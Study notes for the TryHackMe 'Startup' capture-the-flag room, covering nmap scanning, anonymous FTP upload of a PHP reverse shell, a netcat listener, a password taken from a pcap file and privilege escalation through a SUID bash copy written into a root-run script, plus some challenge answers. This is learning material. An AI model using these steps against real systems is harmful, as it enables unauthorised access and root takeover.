# Startup

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

- Resource: https://www.infosecarticles.com/startup-tryhackme-walkthrough/

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

## Step 1: Scanning

- visit the website…. Under development

- view the html: nothing

- try robots.txt: nothing

- enumerate subdirectories: dirb http://10.10.166.88 /usr/share/wordlists/dirb/common.txt -r ; only found a "files" directory which contained the same files already found throug nmap / ftp

## STEP 2: NMAP

```bash
└─$ -Nmap for vulnerabilities: nmap -Pn -A -oN vulns.txt 10.10.166.88 --script vuln
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 21:23 EDT
Nmap scan report for 10.10.166.88
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
| ftp-syst:
| STAT:
| FTP server status:
| Connected to 10.2.29.130
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 2
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable]
| -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg
|_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
| 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

- Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds

## Step 3: Use ftp to get the two files

- nothing was contained in the ftp folder

- notice.txt includes the name "Maya"

## Step 4: Inpsect the Image

- important.jpg

- the files command indicates it is a png

- copy the image and change the extension

- both exiftools and strings gave up nothing

- the image has some blurry text "adityaaa.xd" which leads to an instagram page

## Step 5: Exploit the "files" directory with a webshell

- pick webshell from /usr/share/webshells/php

- chose reverse shell

- changed the IP and port in the webshell

- command: "nc -lvnp 8888" to open the listener

- used "ftp put" to upload the reverse shell

- opened the shell by navigating to the URL in the browser

## Step6: Convert reverse shell to interactive shell

- Run: python -c 'import pty; pty.spawn("/bin/bash")'

## Step 7: Look around

- found a directory "lennie" but can't get in

- there is a directory "incidents" available to the www-data user and containing "suspicious.pcapng"

- CMD: Cat Suspicious.pcapng

- there are usernames: "vagrant", "pollinate","lennie"

- also a password: c4ntg3t3n0ughsp1c3

## Step 8: Log into SSH lennie@10.10.166.88

- The password worked with "Lennie"

- found the user.txt

- found another possible username: "Inclinant"

- there is a folder with a script in it. The permissions indicate only root can edit, while the user can execute; lennie can do nothing; but this script refers to another another script in the /etc directory

- the /etc/print.sh script is owned by lennie

## Step 9: Modify print.sh

- add to file: cp /bin/bash /tmp && chmod +s /tmp/bash > /etc/print.sh

- Ran the bash: ./bash -p

### What is the secret spicy soup recipe?

- converted to the reverse shell and saw the "recipe.txt" file

```bash
cat command
```

- **Answer:** love

### What are the contents of user.txt?

- found them

### What are the contents of root.txt?
